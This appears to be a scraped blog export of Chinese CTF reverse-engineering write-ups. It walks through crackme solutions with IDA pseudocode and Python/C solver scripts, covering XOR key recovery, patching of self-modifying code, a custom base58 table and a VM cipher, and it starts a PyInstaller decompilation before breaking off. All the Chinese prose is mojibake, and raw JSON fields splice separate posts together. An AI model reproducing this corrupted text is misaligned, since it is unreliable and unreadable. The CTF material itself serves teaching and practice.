ï¼Œç„¶åä»è¿™é‡Œè·³åˆ° C43398 è¿™ä¸ªåœ°å€ï¼Œç»§ç»­ä¸‹ä¸€æ­¥è¿ç®—ï¼Œå¦‚æœ v5 - *(_DWORD *)v7 != v11 å°±èµ°åˆ°ä¸‹ä¸¤ä¸ªå†…å­˜åœ°å€æ‰€æŒ‡å‘çš„åœ°å€ã€‚\nè„šæœ¬æ±‚è§£ åŸç†å°±æ˜¯æ ¹æ®åœ°å€è·³ä¸€æ¬¡ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æ±‚è§£äº†ï¼Œç”±äºæ¯ä¸€æ­¥éƒ½æœ‰ä¸¤ç§å¯èƒ½ï¼ˆå®é™…ä¸Šå¹¶ä¸æ˜¯ï¼Œè¦åœ¨å¯è§å­—ç¬¦æœ‰èŒƒå›´çš„ï¼‰\nä¸€å¼€å§‹è§‰å¾—å¯èƒ½åªæœ‰ä¸€ç§è·¯å¾„ï¼Œç›´æ¥ç”¨å¾ªç¯æ±‚è§£äº†ï¼Œç»“æœä¸è¡Œï¼Œå°±å†™äº†ä¸ªdfs\naddr = [ 0x000034, 6, 3, 0x000002, 6, 0xC433E0, 0x00002C, 3, 0xC433D4, 0x00002A, 0xC43458, 0xC43494, 0x000006, 0xC433D4, 0xC433EC, 0x00002A, 6, 0xC43464, 0x00002F, 0xC434B8, 0xC434F4, 0x00002A, 0xC4341C, 0xC43494, 0x000033, 12, 0xC433EC, 0x000003, 0xC433F8, 0xC4341C, 0x000002, 12, 0xC43410, 0x000032, 0xC4347C, 0xC434DC, 0x000032, 0xC43428, 0xC433F8, 0x000032, 3, 0xC434A0, 0x000030, 0, 0xC433EC, 0x000003, 0xC43428, 0xC434A0, 0x000001, 15, 0xC434AC, 0x000032, 0xC433D4, 0xC433EC, 0x00002B, 0xC434D0, 0xC434B8, 0x000002, 0xC43410, 9, 0x00002E, 0xC434D0, 0xC43488, 0x000001, 0xC43434, 0xC433C8, 0x000002, 0xC43434, 0xC4344C, 0x00002D, 6, 0xC4341C, 0x000032, 0xC43440, 0xC433D4, 0x000004, 0xC43494, 0xC43434, 0x00002D, 0xC434E8, 0xC43470, 0x000030, 0xC43494, 3, 0x000031, 0xC43464, 0xC43440, 0x00002F, 0xC433EC, 12, 0x000033, 0xC43488, 0xC43404, 0x000005, 0xC434F4, 0xC434F4, ] for i in range(len(addr)): if addr[i] \u0026gt;= 0xc43380: addr[i] -= 0xc43380 addr[i] //= 4 def dfs(start, add, count): if (add \u0026gt; 0x7e) or add \u0026lt; 0x21: return False if (count \u0026gt;= 21) and (start == 93): print (chr(add), end = \u0026#39;\u0026#39;) return True elif (count \u0026gt;= 21) and start != 93: return False if dfs(addr[start + 1], add + addr[start], count + 1): print (chr(add), end = \u0026#39;\u0026#39;) return True if dfs(addr[start + 2], add - addr[start], count + 1): print (chr(add), end = \u0026#39;\u0026#39;) return True return False dfs(0, 0x30, 5) # 72ab0c6a79cb0b8d0 è¿™ä¸ªæ˜¯å€’åºè¾“å‡ºï¼Œä¸”æœ‰ä¸ª 0 æ˜¯æœ€åˆçš„ 0x30\næœ€ååè½¬è¿‡æ¥å°±è¡Œäº†\nï¼ˆå› ä¸º adworld ä¸ä¼šæäº¤ï¼Œä¹Ÿä¸çŸ¥é“å¯¹ä¸å¯¹ï¼Œåæ­£è¿è¡Œç»“æœæ˜¯ Congratulations!! äº†ï¼‰\nå¤©æ´¥å“ ååè°ƒè¯• æœç´¢ ida å­—ç¬¦ä¸²å¯ä»¥æ‰¾åˆ°åè°ƒè¯•çš„åœ°æ–¹ï¼Œkeypatch ä¿®æ”¹è·³è½¬æˆ–è€…ä¿®æ”¹å‡½æ•°è¿”å›å€¼å³å¯\nç ´è§£ Authorize è¿è¡Œ exe æ–‡ä»¶ï¼Œçœ‹åˆ° Authorize: å­—ç¬¦ä¸²ï¼Œåˆ° ida ä¸­é€šè¿‡ Shift+F12 æ‰¾åˆ°å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œé€šè¿‡äº¤å‰å¼•ç”¨æ‰¾åˆ°å…³é”®å‡½æ•°ã€‚\næŸ¥çœ‹å‡½æ•°ä¼ªä»£ç ï¼š\nint sub_1004011F6() { v39 = \u0026#39;H_gnisiR\u0026#39;; v40 = \u0026#39;eppo\u0026#39;; v41 = \u0026#39;!r\u0026#39;; v42 = 0; v31 = \u0026#39;eht nehW\u0026#39;; v32 = \u0026#39;oh evif \u0026#39;; v33 = \u0026#39;sorc snr\u0026#39;; v34 = \u0026#39;g eht ,s\u0026#39;; v35 = \u0026#39;os nedlo\u0026#39;; v36 = \u0026#39;HT reidl\u0026#39;; v37 = \u0026#39;si RESUO\u0026#39;; v38 = \u0026#39;\\n.nrob \u0026#39;; v25 = \u0026#39;t pmuj A\u0026#39;; v26 = \u0026#39;ks eht o\u0026#39;; v27 = \u0026#39; snrut y\u0026#39;; v28 = \u0026#39;dir a ot\u0026#39;; v29 = \u0026#39;.kcik re\u0026#39;; v30 = \u0026#39;\\n\u0026#39;; v21 = \u0026#39;etneserP\u0026#39;; v22 = \u0026#39;IAZ yb d\u0026#39;; v23 = \u0026#39;\\nA\u0026#39;; v24 = 0; strcpy(v20, \u0026#34;%s\u0026#34;); strcpy(Format, \u0026#34;%20s\u0026#34;); v1 = 17; v2 = 8; v3 = 6; v4 = 10; v5 = 15; v6 = 20; v7 = 42; v8 = 59; v9 = 47; v10 = 3; v11 = 47; v12 = 4; v13 = 16; v14 = 72; v15 = 62; v16 = 0; v17 = 7; v18 = 16; scanf(Format, Str); if ( strlen(Str) != 18 ) { printf(v20, \u0026amp;v25); exit(1); } for ( i = 0; i \u0026lt;= 17; ++i ) { v43 = ~(Str[i] \u0026amp; *((_BYTE *)\u0026amp;v39 + i % 14)) \u0026amp; (Str[i] | *((_BYTE *)\u0026amp;v39 + i % 14)); if ( v43 != *(\u0026amp;v1 + i) ) { printf(v20, \u0026amp;v25); exit(1); } } printf(v20, \u0026amp;v31); return printf(v20, \u0026amp;v21); } æ‰¾åˆ°æœ€åçš„åˆ¤æ–­æ¡ä»¶ v43 != *(\u0026amp;v1 + i)ï¼Œè€Œ v43 æ˜¯é€šè¿‡ä¸€ä¸ªå¼‚æˆ–æ¥ç”Ÿæˆçš„ï¼Œå› æ­¤åªéœ€è¦é€šè¿‡ v1 æ•°ç»„å’Œ v39 æ•°ç»„åå‘æ±‚è§£å¾—åˆ°è¾“å…¥çš„ Str å³å¯ã€‚\nä¸‹é¢æ˜¯æ±‚è§£ä»£ç \nflag = [17, 8, 6, 10, 15, 20, 42, 59, 47, 3, 47, 4, 16, 72, 62, 0, 7, 16] xor = \u0026#39;H_gnisiR\u0026#39;[::-1] + \u0026#39;eppo\u0026#39;[::-1] + \u0026#39;!r\u0026#39;[::-1] for i in range(len(flag)): print (chr(flag[i] ^ ord(xor[i % 14])), end=\u0026#39;\u0026#39;) print () # Caucasus@s_ability patch SMC å°†å¾—åˆ°çš„å­—ç¬¦ä¸²è¾“å…¥ç¨‹åºï¼Œå‘ç°éœ€è¦é€šè¿‡ç¬¬äºŒä¸ªè®¤è¯\nWhen the five horns cross, the golden soldier THOUSER is born. Presented by ZAIA $$$$$$$$$$$$$$ $$$$$$$$$ $$$$$$$ $$$$$$$$$$ $$$$$$$$$$$$$$ $$$$$$$$$$$ $$$$$$$ $$$$$$$$$$$ $$$$$$$$$$$$$$ $$$$$$$$$$$$$ $$$$$$$ $$$$$$$$$$$$$ $$$$$$ $$$$$$ $$$$$$ $$$$$$$ $$$$$$0 $$$$$$ $$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$0 $$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$ $$$$$ $$$ $$$$$$$$$$$$$$$$$$$$ $$$$$$ $$$ $$$$$$ $$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$ $$$$$$ $$0 $$$$$$ $$$$$$$$ Input the flag to hijack the ability of Hiden Intelligence: åœ¨ Strings window ä¸­å¹¶æ²¡æœ‰æ‰¾åˆ° Input the flag çš„å­—ç¬¦ä¸²ï¼Œæ€€ç–‘ç¨‹åºä½¿ç”¨äº† SMCã€‚\næ³•ä¸€ï¼ˆpatch æ–¹æ³•åŒ HGAME FAKEï¼‰ SMC å¯ä»¥æ‰‹åŠ¨ patch æˆ–è€…ä½¿ç”¨åŠ¨æ€è°ƒè¯• dumpï¼Œè¿™é‡Œå…ˆé€‰æ‹©æ‰‹åŠ¨ patch\nåœ¨ ida çš„æ±‡ç¼–é¡µé¢ä¸­æµè§ˆ Data éƒ¨åˆ†ï¼Œå‘ç°åœ¨ 0x10040164D ä½ç½®æœ‰ä¸€é•¿ä¸²æœªè¢« ida è§£æçš„äºŒè¿›åˆ¶æ•°æ®ï¼Œæ¨æµ‹è¿™éƒ¨åˆ†æ˜¯è¢«åŠ å¯†è¿‡çš„ä»£ç ï¼ŒæŒ‰ x äº¤å‰å¼•ç”¨æ‰¾åˆ°åŠ å¯†çš„ä»£ç \n__int64 sub_100401A6C() { sub_100401506(byte_10040164D, 1045i64, Str); sub_10040162B(); return (*(__int64 (**)(void))byte_10040164D)(); } å‘ç°å…ˆç”¨ä¸€ä¸ªå‡½æ•°è°ƒç”¨äº†è¿™æ®µäºŒè¿›åˆ¶æ•°æ®ï¼Œéšåè°ƒç”¨ä»¥è¿™ä¸ªåœ°å€ä¸ºå¼€å¤´çš„å‡½æ•°ã€‚\nè¿›å…¥ sub_100401506 å‡½æ•°ä¸­\nBOOL __fastcall sub_100401506(void *a1, int a2, __int64 a3) { BOOL result; // eax DWORD flOldProtect; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] void *lpAddress; // [rsp+40h] [rbp+10h] int v7; // [rsp+48h] [rbp+18h] __int64 v8; // [rsp+50h] [rbp+20h] lpAddress = a1; // bytes v7 = a2; // 1045 v8 = a3; // Str if ( strlen(Str) != 18 ) exit(1); if ( !VirtualProtect(lpAddress, v7, 0x40u, \u0026amp;flOldProtect) ) exit(1); for ( i = 0; i \u0026lt; v7; ++i ) *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % 18 + v8); // å…³é”®ä»£ç  result = VirtualProtect(lpAddress, v7, flOldProtect, \u0026amp;flOldProtect); if ( !result ) exit(1); return result; } æŠŠå…³é”®ä»£ç ç¾åŒ–ä¸€ä¸‹ï¼š\nfor ( i = 0; i \u0026lt; v7; ++i ) lpAddress[i] ^= v8[i % 18]; // å…³é”®ä»£ç  å‘ç°æ˜¯é€šè¿‡ä¸€ä¸ªå¼‚æˆ–åšçš„åŠ å¯†ï¼Œå¯†é’¥å°±æ˜¯ç¬¬ä¸€æ­¥ä¸­è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚\nå› æ­¤å†™ä¸€ä¸ªpythonè„šæœ¬æ¥è§£å¯†å¹¶ç”Ÿæˆpatchæ–‡ä»¶\nsmc = [0x16, 0x29, 0x0F4, 0x8F, 0x91, 0x72, 0x75, 0x73, 8 , 0x0FE, 0x0F3, 0x45, 0x0E2, 0x69, 0x6C, 0x69, 0x0B3, 0x0FC, 0x0D3, 0x61, 0x75, 0x63, 0x13,0x0D1, 0x6B, 0x73, 0x87, 0x0F6, 0x0CB, 0x61, 0x62, 0x69, 0x0A8, 6 , 0x54, 0x79, 0x84, 0x0E4, 0x0ED, 0x63, 0x61, # ä¸­é—´éƒ¨åˆ†çœç•¥ 0x0FC, 0x0A2, 0x89, 0x2B, 0x74, 0x73, 0x40, 0x9B, 0x1C, 0x60, 0x62, 0x69, 0x84, 0x57, 0x75, 0x79, 0x43, 0x90, 0x48, 0x81, 0x0C4, 0x0F0, 1 , 0 , 0 , 0x5D, 0x0C3] file = open(\u0026#39;patch.py\u0026#39;, \u0026#39;w\u0026#39;) str = \u0026#39;Caucasus@s_ability\u0026#39; title = \u0026#39;\u0026#39;\u0026#39;file_path = \u0026#34;å¤©æ´¥å“.exe\u0026#34; fr = open(file_path, \u0026#34;rb\u0026#34;) fw = open(\u0026#39;modify_\u0026#39;+file_path, \u0026#34;wb\u0026#34;) data = fr.read() fw.write(data) fw.seek(0xc4d) \u0026#39;\u0026#39;\u0026#39; file.write(title) for i in range(1045): smc[i] ^= (ord(str[i % 18])) for i in range(0, 1045, 50): file.write(\u0026#39;fw.write(\u0026#39;) file.write(f\u0026#39;{bytes(smc[i:i + 50])}\u0026#39;) file.write(\u0026#39;)\\n\u0026#39;) file.close() åœ¨å‘½ä»¤è¡Œä¸­ä¾æ¬¡è¿è¡Œ python solve.py å’Œ python patch.py\nä¼šå¾—åˆ°ä¸€ä¸ªæ–°çš„ exe æ–‡ä»¶ modify_å¤©æ´¥å“.exe\nåœ¨ ida ä¸­æ‰“å¼€ï¼Œè¿›å…¥ä¹‹å‰è§£å¯†çš„åœ°å€ï¼Œå‘ç°æ­¤æ—¶å·²ç»å¯ä»¥è¢«è§£æäº†\næ³•äºŒï¼ˆ idapython è‡ªåŠ¨ patchï¼‰ è‡ªå·±æ‰‹åŠ¨ patch çš„å¥½å¤„åœ¨äºå¯ä»¥é¿å…ç›´æ¥å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œå¦‚æœå‡ºç°é”™è¯¯ä¸å®¹æ˜“å¤åŸï¼ˆæ¯•ç«Ÿ ida 7.0 æ²¡æœ‰æ’¤é”€ï¼‰ã€‚è€Œåˆ©ç”¨ idapython çš„æ¥å£è¿›è¡Œ patch åˆ™å†™èµ·æ¥æ›´åŠ æ–¹ä¾¿ã€‚\ndef patch(start, end): str = \u0026#39;Caucasus@s_ability\u0026#39; addr = start while(addr \u0026lt; end + 1): PatchByte(addr, Byte(addr) ^ ord(str[(addr - start) % 18])) addr += 1 print (addr - start) å¦‚æœå°† str å–å‡ºä½œä¸ºå˜é‡çš„ä¸€éƒ¨åˆ†ï¼Œè¿™æ®µä»£ç å°±å¯ä»¥é€šç”¨åˆ°ä¸€äº›å…¶ä»–é¢˜ç›®äº†ã€‚\néšååœ¨ ida çš„ File \u0026gt; script file ä¸­é€‰æ‹©å†™å¥½çš„è„šæœ¬ï¼Œåœ¨ File \u0026gt; script command ä¸­ç›´æ¥è¾“å…¥ patch( \u0026lt;start_addr\u0026gt;, \u0026lt;end_addr\u0026gt;) å³å¯ï¼ˆå…·ä½“çš„ \u0026lt;addr\u0026gt; å¯ä»¥ç›´æ¥ä» ida çš„æ±‡ç¼–é¡µé¢ä¸­è¯»å–ï¼‰\nç‚¹å‡» run åå³å¯ patch æˆåŠŸã€‚\nhijack æŸ¥çœ‹ä¸Šä¸€æ­¥ä¸­æˆåŠŸè§£å¯†çš„ä»£ç \nint sub_10040164D() { v9 = 2007666; v10 = 2125764; v11 = 1909251; v12 = 2027349; v13 = 2421009; v14 = 1653372; v15 = 2047032; v16 = 2184813; v17 = 2302911; v18 = 2263545; v19 = 1909251; v20 = 2165130; v21 = 1968300; v22 = 2243862; v23 = 2066715; v24 = 2322594; v25 = 1987983; v26 = 2243862; v27 = 1869885; v28 = 2066715; v29 = 2263545; v30 = 1869885; v31 = 964467; v32 = 944784; v33 = 944784; v34 = 944784; v35 = 728271; v36 = 1869885; v37 = 2263545; v38 = 2283228; v39 = 2243862; v40 = 2184813; v41 = 2165130; v42 = 2027349; v43 = 1987983; v44 = 2243862; v45 = 1869885; v46 = 2283228; v47 = 2047032; v48 = 1909251; v49 = 2165130; v50 = 1869885; v51 = 2401326; v52 = 1987983; v53 = 2243862; v54 = 2184813; v55 = 885735; v56 = 2184813; v57 = 2165130; v58 = 1987983; v59 = 2460375; strcpy(Format, \u0026#34;Input the flag to hijack the ability of Hiden Intelligence:\u0026#34;); strcpy(v7, \u0026#34;Progrise Key confirmed. Ready to break.\\n\u0026#34;); strcpy(v6, \u0026#34;Jacking Break! Zaia Enterprise.\u0026#34;); strcpy(v5, \u0026#34;%59s\u0026#34;); v3 = 29477; v4 = 0; strcpy(v2, \u0026#34;Not verified!\u0026#34;); v62 = 2147483659; printf(Format); scanf(v5, Str); printf(v7); if ( strlen(Str) != 51 ) { printf(v2); exit(0); } v61 = 19683; for ( i = 0; i \u0026lt;= 0x32; ++i ) { v60 = v61 * (unsigned int)(unsigned __int8)Str[i] % v62; // å…³é”®ä»£ç  if ( v60 != *(\u0026amp;v9 + i) ) // éªŒè¯ { printf(v2); exit(0); } } printf(v6); getchar(); return getchar(); } å°†å…³é”®ä»£ç ç¾åŒ–ä¸€ä¸‹\nif ( *(\u0026amp;v9 + i) != v61 * Str[i] % v62 ) åªè¦ç¡®ä¿å¼å­ä¸¤ç«¯ä¸€ç›´ç›¸ç­‰å°±è¡Œ\nç¨‹åºçš„è¾“å…¥éƒ¨åˆ†è¿˜æ˜¯å­˜åˆ°äº† Str ä¸­ï¼Œå› æ­¤åªéœ€è¦é€šè¿‡å·²ç»å®šä¹‰å¥½çš„æ•°æ±‚å‡º Str å°±å¯ä»¥\nè¿™é‡Œç›´æ¥å¯¹ Str çš„æ¯ä¸€ä½è¿›è¡Œæšä¸¾ï¼ˆä¹Ÿå¯ä»¥ç”¨ z3 solver æˆ–è€…æ±‚æ¨¡é€†ç­‰æ–¹æ³•æ±‚è§£ï¼‰\n#include \u0026lt;stdio.h\u0026gt; int v[51]; int main(){ v[ 0] = 2007666; v[ 1] = 2125764; // ä¸­é—´çœç•¥ v[49] = 1987983; v[50] = 2460375; int v61 = 19683; int res = 0; for(int i = 0; i \u0026lt;= 0x32; ++i){ for(res = 0; res \u0026lt;= 0x80; res++){ if (v[i] == v61 * res % 2147483659){ printf(\u0026#34;%c\u0026#34;, res); break; } } } printf(\u0026#34;\\n\u0026#34;); return 0; } // flag{Thousandriver_is_1000%_stronger_than_zero-one} åœ¨ç¨‹åºä¸­è¾“å…¥è¿™ä¸ªå­—ç¬¦ä¸²åï¼Œå°±èƒ½çœ‹åˆ°å¦‚ä¸‹è¾“å‡º\nInput the flag to hijack the ability of Hiden Intelligence:flag{Thousandriver_is_1000%_stronger_than_zero-one} Progrise Key confirmed. Ready to break. Jacking Break! Zaia Enterprise. è¯´æ˜æˆ‘ä»¬ç ´è§£æˆåŠŸäº†ï¼\nfxck! åœ¨è¾“å‡ºå‰ç»è¿‡äº†ä¸¤ä¸ªå‡½æ•°ï¼ŒçŒœæµ‹ç¬¬ä¸€ä¸ªæ˜¯åŠ å¯†ï¼Œç¬¬äºŒä¸ªæ˜¯éªŒè¯\nçœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œé‡Œé¢å¤§æ¦‚æœ‰ä¸¤æ®µä»£ç æ˜¯æœ‰ç”¨çš„\nç¬¬ä¸€æ®µ\nfor ( i = 0; i \u0026lt; v10; ++i ) { v14 = input_v11[i]; for ( j = 0; j \u0026lt; v12; ++j ) { v14 += (unsigned __int8)v20[j] \u0026lt;\u0026lt; 8; v20[j] = v14 % 58; v14 /= 58u; } while ( v14 ) { v4 = v12++; v20[v4] = v14 % 58; v14 /= 58u; } } ç¬¬äºŒæ®µ\nfor ( k = 0; k \u0026lt;= 57; ++k ) byte_602500[k] ^= byte_602490[k % 7] ^ (unsigned __int8)k; for ( l = 0; l \u0026lt; v12; ++l ) des_v9[v16 + l] = byte_602500[(unsigned __int8)v20[v12 - 1 - l]];// è½¬æˆbase58 des_v9[v12 + v16] = 0; ä¸€çœ‹åˆ°ä¸€å †58çš„å–æ¨¡å’Œé™¤æ³•ï¼ŒçŒœæµ‹æ˜¯base58ç¼–ç \nç„¶ååŠ¨è°ƒæ‹¿ä¸€ä¸‹table\næ¥ä¸‹æ¥çœ‹ç¬¬äºŒä¸ªå‡½æ•°ï¼Œå‘ç°è¾“å…¥ç«Ÿç„¶æœ€åæ¯”è¾ƒçš„æ—¶å€™æ‰å‡ºç°ï¼Œæ•´ä¸ªå‡½æ•°éƒ½æ˜¯ç”¨æ¥ç”Ÿæˆæ­£ç¡®å¯†æ–‡çš„ï¼Œäºæ˜¯ç›´æ¥åŠ¨è°ƒæ‹¿å¯†æ–‡\nå†™ä¸ªè„šæœ¬æ±‚è§£å°±è¡Œäº†\nkey = [0x14, 0x98, 0xE6, 0x55, 0xC8, 0xBF, 0xAA] init = [ 0x55, 0xDB, 0xA7, 0x12, 0x89, 0xFC, 0xEB, 0x5B, 0xDA, 0xA4, 0x13, 0x8E, 0xFD, 0xF7, 0x4B, 0xC5, 0xA5, 0x10, 0x8F, 0xFA, 0xE9, 0x59, 0xD7, 0xAB, 0x7C, 0xE3, 0x96, 0x85, 0x3D, 0xB3, 0xCF, 0x72, 0xD1, 0xFF, 0xEA, 0x54, 0xD8, 0xA6, 0x15, 0x88, 0xFF, 0xEA, 0x54, 0xD8, 0xA7, 0x16, 0x89, 0xE0, 0xEB, 0x57, 0xD9, 0xA1, 0x14, 0x8B, 0xFE, 0xE5, 0x55, 0xDB ] true_table = \u0026#39;\u0026#39; for i in range(len(init)): init[i] ^= key[i % 7] ^ i true_table += \u0026#39;%c\u0026#39; % init[i] from base58 import * flag = \u0026#39;4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe\u0026#39; fake_table = \u0026#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#39; true_flag = \u0026#39;\u0026#39; for i in range(len(flag)): true_flag += fake_table[true_table.index(flag[i])] print (b58decode(true_flag)) # b\u0026#39;\\x06flag{63510cf7-2b80-45e1-a186-21234897e5cd}\u0026#39; å¾—åˆ°flag\næ‹¿åˆ°flagä¹‹åç”¨ç¨‹åºéªŒè¯ï¼Œç»“æœå‘ç°æ²¡æœ‰é€šè¿‡ï¼Œä»¥ä¸ºè‡ªå·±åªåœ¨ç¬¬ä¸€å±‚ï¼Œbase58åˆ†æé”™äº†ï¼Œäºæ˜¯ä»å¤´è®¤çœŸè¯»ä»£ç  æœ€åä¸Šç½‘çœ‹äº†wpï¼Œæ‰å‘ç°flagå°±æ˜¯è¿‡ä¸äº†éªŒè¯\neasyparser è§è¿‡çš„æœ€å¤§çš„VMäº†ï¼Œè¾¹åŠ¨è°ƒè¾¹è¯»æŒ‡ä»¤\nå…ˆæ˜¯ä¸€å †åˆå§‹åŒ–ï¼Œç›´æ¥åŠ¨è°ƒè¿‡å»ï¼Œæ‰¾è¾“å…¥\nå‘ç°ç”¨äº†ä¸ªå¾ªç¯ï¼Œå…ˆå°†è¾“å…¥æ”¾åˆ°ä¸€ä¸ªåœ°å€é‡Œ\nåˆ¤æ–­æœ€åä¸€ä¸ªæ˜¯å¦ä¸º }\nç„¶åï¼Œå°†è¾“å…¥çš„ä¸€éƒ¨åˆ†å–å‡ºï¼Œå­˜åˆ°äº†æŸä¸ªåœ°å€+0xE1åˆ°+0x100ï¼Œæ­£å¥½32ä½\nç„¶ååˆ¤æ–­ä¸€ä¸‹å¤´æ˜¯ä¸æ˜¯ flag{\næ¥ä¸‹æ¥åˆè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œå‘ç°å°†æŸä¸ªåœ°å€çš„æ•°å­—å–å‡ºï¼Œå­˜åˆ°äº†7å·å¯„å­˜å™¨ä¸­ï¼Œç„¶åå°†å¯¹åº”ä½çš„è¾“å…¥å–å‡ºï¼Œå­˜åˆ°6å·å¯„å­˜å™¨ä¸­\nå¯¹6å·å¯„å­˜å™¨åˆ†åˆ«è¿›è¡Œäº† ^0x63 å’Œ \u0026lt;\u0026lt;2 ä¸¤ä¸ªæŒ‡ä»¤\nç„¶åå’Œ7å·å¯„å­˜å™¨è¿›è¡Œæ¯”è¾ƒ\nçŒœæµ‹å¯¹æ‰€æœ‰æ˜æ–‡éƒ½è¿›è¡Œäº†åŒæ ·çš„åŠ å¯†ï¼Œæ‰€ä»¥ç›´æ¥ä»åœ°å€ä¸­å–å‡ºå¯†æ–‡ï¼Œè§£å¯†\ncipher = [144,332,28,240,132,60,24,64,64,240,208,88,44,8,52,240,276,240,128,44,40,52,8,240,144,68,48,80,92,44,264,240] for c in cipher: print (chr((c \u0026gt;\u0026gt; 2) ^ 0x63), end = \u0026#39;\u0026#39;) print () # G0d_Bless_Wuhan_\u0026amp;_China_Growth!_ ","date":"2021-03-31T20:33:02Z","permalink":"/post/gxzy-re-writeups/","title":"é«˜æ ¡æˆ˜å½¹ re writeups"},{"content":"notsudoku V\u0026amp;NCTFç›´æ¥ç™½ç»™äº†ï¼Œå…¨ç¨‹è€—åœ¨äº†Crackme2ä¸Šï¼Œè¾›è¾›è‹¦è‹¦æ‰¾åˆ°å¯†æ–‡å’Œç®—æ³•åå‘ç°éœ€è¦åŠ¨æ€è°ƒè¯•ï¼Ÿè¿‡ç¨‹ä¸­not sudokuè¿™é¢˜å°±æ‰«äº†ä¸€çœ¼ï¼Œç»“æœè¿˜æ²¡å‘ç°æ˜¯pythoné€†å‘ï¼Œäºæ˜¯å°±çˆ¬çˆ¬äº†ã€‚\næ­£æ–‡ å¥½åƒæ˜¯ç¬¬ä¸€æ¬¡åšpython exeçš„é€†å‘\né¦–å…ˆä½¿ç”¨ exeinfo å·®å£³ï¼Œå‘ç°æœ‰ä¸ª UPX\nç”¨ upx.exe -d è„±å£³\næ¯”èµ›çš„æ—¶å€™æ²¡æƒ³åˆ°è¿™ä¸ªæ˜¯pythoné€†å‘ï¼Œç›´æ¥æ‹–åˆ°idaé‡Œé¢äº†ï¼Œäºæ˜¯ç›´æ¥gg\nå†ä½¿ç”¨ exeinfo æŸ¥ä¸€ä¸‹ï¼Œä¼šå‘ç°æ˜¯ pyinstaller ç¼–è¯‘çš„æ–‡ä»¶ï¼Œè¯´æ˜æ˜¯pythoné€†å‘\nä¸Šç½‘ä¸‹è½½ä¸€ä¸‹ pyinstxtractor.py è¿›è¡Œåç¼–è¯‘\n$ python3 pyinstxtractor.py notsudoku-noupx.exe è¿›å…¥æ–‡ä»¶å¤¹ï¼Œæ‰¾æ²¡æœ‰åç¼€çš„æ–‡ä»¶ï¼Œå‘ç°æœ‰ä¸€ä¸ªå«åš 2 çš„ï¼Œä½¿ç”¨ 010editor ä» struct æ–‡ä»¶å¤åˆ¶æ–‡ä»¶å¤´ï¼ˆç¬¬ä¸€è¡Œï¼‰ï¼Œç„¶åæ·»åŠ  .pyc åç¼€ï¼Œè¿›è¡Œ pyc åç¼–è¯‘\n$ uncompyle6 -o 2.py 2.pyc å³å¯å¾—åˆ° python æºç æ–‡ä»¶\nå‘ç°æ–‡ä»¶é‡Œæœ‰ä¸€äº›æ—¥æ–‡ï¼Œäºæ˜¯è¾¹é˜…è¯»è¾¹ä¿®æ”¹å°±è¡Œ\n# uncompyle6 version 3.7.4 # Python bytecode 3.7 (3394) # Decompiled from: Python 3.6.9 (default, Jan 26 2021, 15:33:00) # [GCC 8.4.0] # Embedded file name: 2.py # Compiled at: 1995-09-28 00:18:56 # Size of source mod 2**32: 272 bytes import time, sys, hashlib class class_a: def __init__(self): self.dic = {} self.list_a = [] self.inputflag = \u0026#39;\u0026#39; self.list_b = [] self.int = 65 def ãˆ(self, other): def ã®(f): self.dic[other] = f return f return ã® def ãŠ(self, other): return self.dic.get(other) def run(self): i = 0 while True: invoke = self.list_a[i][0] value = self.list_a[i][1] value_2 = self.list_a[i][2] func = self.ãŠ(invoke) func(value, value_2) i += 1 object_a = class_a() @object_a.ãˆ(\u0026#39;add\u0026#39;) def f(a, b): if a == 1: object_a.list_b += b @object_a.ãˆ(\u0026#39;string\u0026#39;) def f(a, b): if a == 1: print(object_a.inputflag) else: if a == 2: print(object_a.list_b) else: if a == 3: print((object_a.flag), end=\u0026#39;\u0026#39;) else: print(a, end=\u0026#39;\u0026#39;) @object_a.ãˆ(\u0026#39;exit\u0026#39;) def f(a, b): sys.exit() @object_a.ãˆ(\u0026#39;input\u0026#39;) def f(a, b): object_a.inputflag = input() @object_a.ãˆ(\u0026#39;sleep\u0026#39;) def f(a, b): time.sleep(a) @object_a.ãˆ(\u0026#39;crypt\u0026#39;) def f(a, b): if len(object_a.inputflag) % 2 != 0: sys.exit() for i in object_a.inputflag: if ord(i) \u0026gt; 52 or ord(i) \u0026lt; 48: # input \u0026gt; \u0026#39;0\u0026#39;, input \u0026lt; \u0026#39;4\u0026#39; sys.exit() x = str(hashlib.new(\u0026#39;md5\u0026#39;, bytes((object_a.inputflag), encoding=\u0026#39;utf8\u0026#39;)).hexdigest()) if x[:6] != \u0026#39;e3a912\u0026#39;: # md5 start with \u0026#39;e3a912\u0026#39; sys.exit() object_a.flag = x @object_a.ãˆ(\u0026#39;initlist\u0026#39;) def f(a, b): j = 0 for i in range(0, len(object_a.inputflag), 2): j += 1 a = int(object_a.inputflag[i]) b = int(object_a.inputflag[(i + 1)]) object_a.list_b[a][b] = j # ä¸ºlist_bèµ‹å€¼ @object_a.ãˆ(\u0026#39;basiccheck\u0026#39;) def f(a, b): if object_a.list_b[0][1] != 24 or object_a.list_b[4][3] != 2: sys.exit() if object_a.list_b[0][2] != 1 or object_a.list_b[2][3] != 20: sys.exit() if object_a.list_b[1][0] != 23 or object_a.list_b[3][4] != 3: sys.exit() # 024334xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx23xxxx1001xx @object_a.ãˆ(\u0026#39;check\u0026#39;) def f(a, b): int = 0 if b == -1: for i in range(5): int += object_a.list_b[a][i] if int != object_a.int: sys.exit() else: for i in range(5): int += object_a.list_b[i][b] if int != object_a.int: sys.exit() # list_b æ¯è¡Œæ¯åˆ—å’Œä¸º65 # 02433420112112034430403122130414004132233324100142 object_a.list_a = [ [ \u0026#39;string\u0026#39;, \u0026#39;welcome baby~ \u0026#39;, 0], [ 